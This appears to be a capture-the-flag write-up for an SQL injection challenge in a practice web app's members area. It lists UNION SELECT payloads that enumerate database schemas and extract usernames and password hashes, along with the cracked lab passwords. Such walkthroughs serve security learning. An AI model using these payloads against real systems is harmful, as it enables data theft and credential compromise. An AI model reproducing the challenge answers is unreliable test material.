# SQL Injection in Members Area

### Tools
SQL injections list from:https://github.com/payloadbox/sql-injection-payload-list

SQL UNION ATACK guide: https://charlesreid1.com/wiki/SQL_Injection/UNION_Attack
Since we are not allowed to use automated tools like sqlmap.

### How to solve it

1. Firt run multiple sql injetion untill something happens using : 
```
 1 UNION SELECT NULL,NULL
```
2. Later on we try multiple commands and we findout some stuff, member 5 has a Flag inside it, but we couldn't found any password or user info .
```
 5 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```
3. With this command we get a list with all schemas and tables and their columns searching for some words we found password and user columns on db_default .
```
 5 union select table_name, table_schema from information_schema.columns 
 5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns-- 
```
4. Now we try to access users table to get users info and we get this : 2b3366bcfd44f540e630d4dc2b9b06d9 cracking it we get :	YesWeCan.
```
 5 union SELECT town, countersign FROM Member_Sql_Injection.users LIMIT 2
```
5. Now we try to access users table to get db_default info and we found this : root : 3bf1114a986ba87ed28fc1b5884fc2f8 cracking it we get :shadow.
```
 5 union SELECT username,password FROM Member_Brute_Force.db_default LIMIT 2
```
